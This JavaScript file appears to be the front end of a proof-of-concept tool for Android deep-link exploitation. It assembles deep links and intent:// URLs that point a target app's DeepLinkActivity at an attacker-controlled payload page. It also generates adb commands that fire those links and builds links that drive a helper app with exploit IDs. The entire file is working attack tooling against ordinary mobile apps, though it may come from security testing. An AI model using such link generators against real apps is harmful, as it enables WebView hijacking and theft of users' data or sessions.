const helperScheme = "poc-targetapp";
const helperPackage = "com.poc.targetapp";
const serverOrigin = (() => {
  try {
    return `${location.protocol}//${location.host}`;
  } catch {
    return "http://127.0.0.1:8000";
  }
})();

const exploitInput = document.getElementById("exploit-id");
const extraInput = document.getElementById("extra-query");
const helperCustomLink = document.getElementById("helper-custom-link");
const helperIntentLink = document.getElementById("helper-intent-link");

const deepLinkPrefixInput = document.getElementById("deep-link-prefix");
const targetPackageInput = document.getElementById("target-package");
const targetActivityInput = document.getElementById("target-activity");
const attackerUrlInput = document.getElementById("attacker-url");
const deepLinkUrl = document.getElementById("deep-link-url");
const intentUrl = document.getElementById("intent-url");
const adbCommands = document.getElementById("adb-commands");

attackerUrlInput.placeholder = `${serverOrigin}/payload.html`;

function buildHelperQuery() {
  const exploitId = encodeURIComponent(exploitInput.value.trim() || "sample-exploit");
  const extra = extraInput.value.trim();
  return extra ? `exploit=${exploitId}&${extra}` : `exploit=${exploitId}`;
}

function renderHelperLinks() {
  const query = buildHelperQuery();
  helperCustomLink.href = `${helperScheme}://run/trigger?${query}`;
  helperCustomLink.textContent = helperCustomLink.href;
  helperIntentLink.href = `intent://run/trigger?${query}#Intent;scheme=${helperScheme};package=${helperPackage};end`;
  helperIntentLink.textContent = helperIntentLink.href;
}

function normalizeAttackerUrl() {
  return attackerUrlInput.value.trim() || `${serverOrigin}/payload.html`;
}

function normalizeDeepLink() {
  const prefix = deepLinkPrefixInput.value.trim();
  const payloadUrl = encodeURIComponent(normalizeAttackerUrl());
  return `${prefix}${payloadUrl}`;
}

function normalizeIntentUrl(deepLink) {
  const pkg = targetPackageInput.value.trim() || "TARGET_PACKAGE";
  const activity = targetActivityInput.value.trim() || "TARGET_PACKAGE/.DeepLinkActivity";

  let parsed;
  try {
    parsed = new URL(deepLink);
  } catch {
    return "";
  }

  const path = `${parsed.hostname}${parsed.pathname}${parsed.search}`;
  return `intent://${path}#Intent;scheme=${parsed.protocol.replace(":", "")};package=${pkg};component=${activity};end`;
}

function renderDeepLinkVariants() {
  const deepLink = normalizeDeepLink();
  const intentLink = normalizeIntentUrl(deepLink);
  const activity = targetActivityInput.value.trim() || "TARGET_PACKAGE/.DeepLinkActivity";

  deepLinkUrl.href = deepLink;
  deepLinkUrl.textContent = deepLink;

  intentUrl.href = intentLink || "#";
  intentUrl.textContent = intentLink || "(invalid deep link prefix)";

  adbCommands.textContent =
    `# Implicit VIEW\n` +
    `adb shell am start -a android.intent.action.VIEW \\\n` +
    `  -d "${deepLink}"\n\n` +
    `# Explicit activity\n` +
    `adb shell am start -n ${activity} \\\n` +
    `  -a android.intent.action.VIEW \\\n` +
    `  -d "${deepLink}"\n\n` +
    `# Browser-style intent URL\n` +
    `${intentLink || "(invalid deep link prefix)"}`;
}

exploitInput.addEventListener("input", renderHelperLinks);
extraInput.addEventListener("input", renderHelperLinks);
deepLinkPrefixInput.addEventListener("input", renderDeepLinkVariants);
targetPackageInput.addEventListener("input", renderDeepLinkVariants);
targetActivityInput.addEventListener("input", renderDeepLinkVariants);
attackerUrlInput.addEventListener("input", renderDeepLinkVariants);

renderHelperLinks();
renderDeepLinkVariants();
